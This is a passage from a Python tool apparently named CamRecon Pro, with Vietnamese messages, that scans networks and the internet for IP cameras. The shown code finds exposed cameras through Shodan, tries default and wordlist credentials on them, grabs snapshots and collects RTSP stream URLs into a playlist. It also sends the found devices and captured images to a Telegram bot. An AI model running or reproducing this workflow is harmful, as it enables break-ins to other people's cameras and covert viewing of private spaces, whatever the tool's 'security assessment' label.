<body><h2>CamRecon Pro v{VERSION} - Kết quả quét ({datetime.now().strftime('%Y-%m-%d %H:%M:%S')})</h2>
<table><tr><th>IP</th><th>Brand</th><th>MAC</th><th>Ports</th><th>Credentials</th>
<th>CVE</th><th>RTSP Streams</th><th>ONVIF</th></tr>{rows}</table></body></html>"""
    with open(path, "w", encoding="utf-8") as f:
        f.write(html)
    log(f"Đã xuất HTML: {path}", "ok")


def export_m3u(results, path):
    lines = ["#EXTM3U"]
    for r in results:
        for s in r["streams"]:
            lines.append(f"#EXTINF:-1,{r['ip']} - {r['brand']}")
            lines.append(s)
    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")
    log(f"Đã xuất playlist M3U: {path} ({len(lines)//2} stream)", "ok")


# ============================ TELEGRAM + SHODAN ============================
def telegram_notify(token, chat_id, text):
    if not token or not chat_id:
        return
    try:
        r = requests.post(f"https://api.telegram.org/bot{token}/sendMessage",
                          json={"chat_id": chat_id, "text": text,
                                "parse_mode": "Markdown", "disable_web_page_preview": True},
                          timeout=10)
        if r.status_code == 200:
            log("Đã gửi thông báo Telegram", "ok")
        else:
            log(f"Telegram lỗi: {r.status_code}", "warn")
    except Exception as e:
        log(f"Telegram fail: {e}", "warn")


def telegram_send_photo(token, chat_id, photo_path, caption=""):
    if not token or not chat_id or not os.path.exists(photo_path):
        return
    try:
        with open(photo_path, "rb") as f:
            r = requests.post(f"https://api.telegram.org/bot{token}/sendPhoto",
                              data={"chat_id": chat_id, "caption": caption},
                              files={"photo": f}, timeout=15)
        log(f"Đã gửi ảnh snapshot qua Telegram ({r.status_code})", "ok")
    except Exception as e:
        log(f"Telegram photo fail: {e}", "warn")


def shodan_search(api_key, query, pages=1):
    """Tìm camera trên Internet qua Shodan REST API (không cần pip install shodan)."""
    if not api_key:
        log("Thiếu SHODAN_API_KEY (export SHODAN_API_KEY=xxx)", "err")
        return []
    found = []
    for page in range(1, pages + 1):
        try:
            r = requests.get("https://api.shodan.io/shodan/host/search",
                             params={"key": api_key, "query": query, "page": page},
                             timeout=15)
            if r.status_code != 200:
                log(f"Shodan lỗi: {r.status_code} {r.text[:120]}", "warn")
                break
            data = r.json()
            for m in data.get("matches", []):
                found.append({"ip": m["ip_str"], "port": m.get("port", 80),
                              "product": m.get("product", ""), "org": m.get("org", "")})
            log(f"Shodan page {page}: {len(data.get('matches', []))} kết quả", "info")
        except Exception as e:
            log(f"Shodan fail: {e}", "warn")
            break
    return found


# ============================ KẾT HỢP BÁO CÁO + LƯU FILE ============================
def report(results):
    if not results:
        log("Không tìm thấy thiết bị camera nào.", "err")
        return
    existing = {r["ip"] for r in results_global}
    results_global.extend([r for r in results if r["ip"] not in existing])
    print_report(results_global)
    export_json(results_global, "report.json")
    export_txt(results_global, "report.txt")
    export_html(results_global, "report.html")
    export_m3u(results_global, "streams.m3u")
    tg_token = os.environ.get("TG_TOKEN", "")
    tg_chat = os.environ.get("TG_CHAT_ID", "")
    if tg_token and tg_chat:
        telegram_notify(tg_token, tg_chat,
                        f"*CamRecon Pro* - {len(results_global)} camera phát hiện\n" +
                        "\n".join(f"`{r['ip']}` {r['brand']} - {len(r['streams'])} stream"
                                  for r in results_global[:10]))


# ============================ MENU TƯƠNG TÁC ============================
def interactive_menu(opts):
    print(f"""
\033[96m┌──────────────────────────────────────────────┐
│        CamRecon Pro v{VERSION}  (Termux)          │
├──────────────────────────────────────────────┤
│  1. Quét toàn bộ mạng LAN hiện tại            │
│  2. Quét 1 subnet cụ thể                       │
│  3. Kiểm tra 1 IP (deep: CVE + ONVIF)         │
│  4. Quét nhanh 1 IP (không CVE/ONVIF)         │
│  5. WS-Discovery (tìm camera ONVIF trên LAN)  │
│  6. Brute-force 1 IP với wordlist             │
│  7. Tìm camera trên Internet (Shodan)         │
│  8. Chụp snapshot từ kết quả đã lưu           │
│  9. Thoát                                      │
└──────────────────────────────────────────────┘\033[0m""")
    while True:
        try:
            ch = input("\n[?] Chọn: ").strip()
        except (EOFError, KeyboardInterrupt):
            return
        if ch == "1":
            for sn in get_subnets():
                report(scan_subnet(sn, opts))
        elif ch == "2":
            sn = input("    Subnet (vd 192.168.1.0/24): ").strip()
            report(scan_subnet(sn, opts))
        elif ch in ("3", "4"):
            ip = input("    IP: ").strip()
            opts.fast = (ch == "4")
            r = analyze_host(ip, opts)
            report([r] if r else [])
            if r and input("    Chụp snapshot? (y/N): ").lower() == "y":
                os.makedirs("snaps", exist_ok=True)
                grab_snapshot(r, "snaps")
        elif ch == "5":
            log("Gửi WS-Discovery probe...")
            devs = onvif_ws_discover(5)
            if devs:
                for d in devs:
                    print(f"    [ONVIF] {d['xaddr']} (from {d['src']})")
            else:
                log("Không tìm thấy thiết bị ONVIF.", "warn")
        elif ch == "6":
            ip = input("    IP: ").strip()
            ul = input("    File users (Enter = builtin): ").strip() or None
            pl = input("    File passwords (Enter = builtin): ").strip() or None
            users = load_list(ul, BUILTIN_USERS)
            passes = load_list(pl, BUILTIN_PASS)
            log(f"Brute-force {ip} ({len(users)}x{len(passes)})...")
            res = brute_host(ip, users, passes)
            for c in res:
                print(f"    [FOUND] {c['user']}:{c['pass']} ({c['proto']}:{c['port']})")
            if not res:
                log("Không tìm thấy credentials.", "warn")
        elif ch == "7":
            q = input("    Query (vd 'port:554' hoặc 'title:Hikvision'): ").strip() or "port:554"
            key = os.environ.get("SHODAN_API_KEY", "")
            if not key:
                key = input("    SHODAN_API_KEY: ").strip()
            found = shodan_search(key, q)
            for f in found:
                print(f"    {f['ip']}:{f['port']}  {f['product']}  {f['org']}")
            if found and input("    Test default creds trên kết quả? (y/N): ").lower() == "y":
                for f in found:
                    r = analyze_host(f["ip"], opts)
                    if r:
                        report([r])
        elif ch == "8":
            if not os.path.exists("report.json"):
                log("Chưa có report.json. Quét trước đã.", "warn")
                continue
            with open("report.json", "r", encoding="utf-8") as f:
                res_list = json.load(f)
            os.makedirs("snaps", exist_ok=True)
            for r in res_list:
                fn = grab_snapshot(r, "snaps")
                if fn:
                    log(f"Snapshot {r['ip']} -> {fn}", "ok")
                    tg_token = os.environ.get("TG_TOKEN", "")
                    tg_chat = os.environ.get("TG_CHAT_ID", "")
                    telegram_send_photo(tg_token, tg_chat, fn, f"CamRecon: {r['ip']}")
        elif ch == "9":
            return


# ============================ MAIN ============================
def main():
    global TIMEOUT, THREADS
    ap = argparse.ArgumentParser(description="CamRecon Pro - Camera security assessment (Termux)")
    ap.add_argument("-t", "--target", help="Kiểm tra 1 IP")
    ap.add_argument("-s", "--subnet", help="Quét 1 subnet (192.168.1.0/24)")
    ap.add_argument("-b", "--brute", help="Brute-force 1 IP với wordlist mặc định")
    ap.add_argument("-u", "--users", help="File users cho brute-force")
    ap.add_argument("-p", "--passwords", help="File passwords cho brute-force")
    ap.add_argument("--fast", action="store_true", help="Bỏ qua CVE/ONVIF (quét nhanh)")
    ap.add_argument("-T", "--threads", type=int, default=THREADS, help="Số luồng (mặc định 100)")
    ap.add_argument("--timeout", type=float, default=TIMEOUT, help="Timeout giây (mặc định 3)")
    ap.add_argument("--snapshot", action="store_true", help="Chụp snapshot từ report.json")
    ap.add_argument("--shodan", help="Tìm camera trên Shodan (cần SHODAN_API_KEY env)")
    ap.add_argument("--discover", action="store_true", help="WS-Discovery ONVIF")
    args = ap.parse_args()

    TIMEOUT = args.timeout
    THREADS = args.threads

    print(f"\nCamRecon Pro v{VERSION} - Camera Security Assessment (Termux/Android)")
    print("=" * 54)

    if args.snapshot:
        if not os.path.exists("report.json"):
            log("Chưa có report.json. Quét trước đã.", "err")
            return
        with open("report.json", "r", encoding="utf-8") as f:
            res_list = json.load(f)
        os.makedirs("snaps", exist_ok=True)
        for r in res_list:
            fn = grab_snapshot(r, "snaps")
            log(f"Snapshot {r['ip']} -> {fn}" if fn else f"Snapshot {r['ip']} fail",
                "ok" if fn else "warn")
        return
    if args.shodan:
        found = shodan_search(os.environ.get("SHODAN_API_KEY", ""), args.shodan)
        for f in found:
            print(f"    {f['ip']}:{f['port']}  {f['product']}  {f['org']}")
        return
    if args.discover:
        devs = onvif_ws_discover(6)
        for d in devs:
            print(f"    [ONVIF] {d['xaddr']} (from {d['src']})")
        return

    opts = argparse.Namespace(fast=args.fast, threads=args.threads)

    if args.brute:
        users = load_list(args.users, BUILTIN_USERS)
        passes = load_list(args.passwords, BUILTIN_PASS)
        log(f"Brute-force {args.brute} ({len(users)} users x {len(passes)} passes)")
        found = brute_host(args.brute, users, passes)
        for c in found:
            print(f"    [FOUND] {c['user']}:{c['pass']} ({c['proto']}:{c['port']})")
        if not found:
            log("Không tìm thấy credentials.", "warn")
        return

    try:
        if args.target:
            r = analyze_host(args.target, opts)
            report([r] if r else [])
        elif args.subnet:
            report(scan_subnet(args.subnet, opts))
        else:
            interactive_menu(opts)
    except KeyboardInterrupt:
        log("Đã dừng bởi người dùng.", "warn")


if __name__ == "__main__":
    main()
